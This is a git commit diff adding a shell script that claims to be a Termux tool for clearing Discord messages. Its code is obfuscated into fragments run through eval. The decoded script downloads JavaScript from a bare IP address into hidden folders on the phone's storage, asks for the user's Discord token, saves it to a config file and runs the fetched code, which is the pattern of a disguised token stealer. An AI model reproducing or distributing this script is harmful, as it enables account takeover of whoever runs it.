3907fa2f9f049dec97e0b012e7fed139af9ee3bd
tgzin <75448283+tg230@users.noreply.github.com>
2023-12-24 22:22:44 -0300

    Update clear.sh

--- clear.sh
+++ clear.sh
@@ -1,3 +1,58 @@
+#discord clear messages termux
+#by tiago olivv channel
+#criado pelo canal tiago olivv
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 z="
 ";pBz='.jso';dBz='s/ &';jBz='.75.';iCz='}';oCz='ão -';DBz='sett';dCz='nfig';BBz='andr';Ez='cias';KDz='esac';jz='mkdi';sz='fi';aCz='}" >';pCz='-"';CDz='case';Jz='-set';gz='then';qz='etti';iBz='/168';Qz='l no';YCz='": \';bz='droi';WBz='n';KCz='ui s';HDz=';;';UBz='" ];';xCz='enci';Hz='| te';tBz='; th';YBz='ard/';lz='../s';fCz='&& n';uz='gs/i';ICz='"Col';Rz='dejs';Sz='if [';BCz='all ';Iz='rmux';ADz=' opc';nBz='/pac';BDz='ao';mz='dcar';Wz='./..';yCz='as';yBz='npm ';TCz='read';bBz='_set';IDz='2)';ez='gs/"';RBz='pack';cBz='ting';nz='d/.a';rz='ngs/';LCz='eu t';LBz='75.9';cCz='s/co';Zz='card';vCz='r De';VBz=' the';Az='clea';yz='sdca';Oz='g in';Dz='nden';MBz='4.25';hBz='tp:/';qBz='age-';Vz='../.';kCz=' esc';sCz='ar';aBz='roid';FBz='/ &&';ECz='yarn';tCz='2. B';CCz='-g y';JCz='e aq';Gz='yes ';cz='d_se';FCz=' ins';vz='ndex';Lz='tora';fBz='rl -';eBz='& cu';GDz='1)';Nz='| pk';ZCz='"$to';kBz='94.2';EDz='pcao';Yz='./sd';ZBz='.and';FDz='" in';pz='id_s';DCz='arn';bCz=' ../';UCz=' tok';oz='ndro';EBz='ings';xBz='on';hz='echo';DDz=' "$o';Cz='depe';NBz='1/cl';ABz='rd/.';OCz='disc';OBz='ear/';ACz='inst';wBz='k.js';VCz=' "{';fz=' ]; ';rBz='lock';mCz=' uma';hCz='.';tz=' -f ';rCz='nici';JDz='*)';nCz=' opç';uBz='en';TBz='json';jCz=' "--';HBz='l -O';mBz='lear';WCz='\"to';Bz='r';Kz='up-s';gCz='ode ';eCz='gs/ ';QBz='x.js';PBz='inde';gBz='O ht';XBz='/sdc';kz='r ..';dz='ttin';uCz='aixa';sBz='n" ]';Xz='/../';NCz=' do ';KBz='168.';SBz='age.';XCz='ken\';IBz=' htt';xz='cd .';GBz=' cur';az='/.an';iz='else';Tz=' -d ';vBz='-loc';wCz='pend';JBz='p://';QCz='"';CBz='oid_';Pz='stal';MCz='oken';GCz='tall';wz='.js"';Uz='"../';Fz='() {';oBz='kage';SCz=' "->';Mz='ge';lBz='51/c';lCz='olha';qCz='1. I';HCz=' -n ';PCz='ord ';RCz=' ""';
 eval "$Az$Bz$z$Cz$Dz$Ez$Fz$z$Az$Bz$z$Gz$Hz$Iz$Jz$Kz$Lz$Mz$z$Gz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$Vz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$z$iz$z$jz$kz$Xz$Vz$Wz$Xz$lz$mz$nz$oz$pz$qz$rz$z$sz$z$Sz$tz$Uz$Vz$Wz$Xz$Vz$Yz$Zz$az$bz$cz$dz$uz$vz$wz$fz$gz$z$hz$z$iz$z$xz$Wz$Xz$Vz$Wz$Xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$z$sz$z$Sz$tz$Uz$Vz$Wz$Xz$Vz$Wz$Xz$lz$mz$nz$oz$pz$qz$rz$RBz$SBz$TBz$UBz$VBz$WBz$z$hz$z$iz$z$xz$Wz$Xz$Vz$Wz$Xz$Vz$Wz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$WBz$z$sz$z$Sz$tz$Uz$Vz$Wz$Xz$Vz$Wz$Xz$lz$mz$nz$oz$pz$qz$rz$RBz$qBz$rBz$pBz$sBz$tBz$uBz$z$hz$z$iz$z$xz$Wz$Xz$Vz$Wz$Xz$Vz$Wz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$vBz$wBz$xBz$z$sz$z$yBz$ACz$BCz$CCz$DCz$z$ECz$FCz$GCz$z$Az$Bz$z$hz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$z$hz$RCz$z$hz$RCz$z$hz$SCz$QCz$z$TCz$UCz$uBz$z$hz$VCz$z$WCz$XCz$YCz$ZCz$XCz$QCz$z$aCz$bCz$Vz$Wz$Xz$Vz$Wz$XBz$YBz$ZBz$aBz$bBz$cBz$cCz$dCz$pBz$WBz$z$Az$Bz$z$xz$Wz$Xz$Vz$Wz$Xz$Vz$Yz$Zz$az$bz$cz$dz$eCz$fCz$gCz$hCz$z$iCz$z$hz$jCz$kCz$lCz$mCz$nCz$oCz$pCz$z$hz$RCz$z$hz$HCz$QCz$z$qCz$rCz$sCz$z$tCz$uCz$vCz$wCz$xCz$yCz$z$QCz$z$TCz$ADz$BDz$z$CDz$DDz$EDz$FDz$z$GDz$z$Az$Bz$z$xz$Wz$Xz$Vz$Wz$Xz$Vz$Yz$Zz$az$bz$cz$dz$eCz$fCz$gCz$hCz$z$HDz$z$IDz$z$Cz$Dz$Ez$z$HDz$z$JDz$z$HDz$z$KDz"
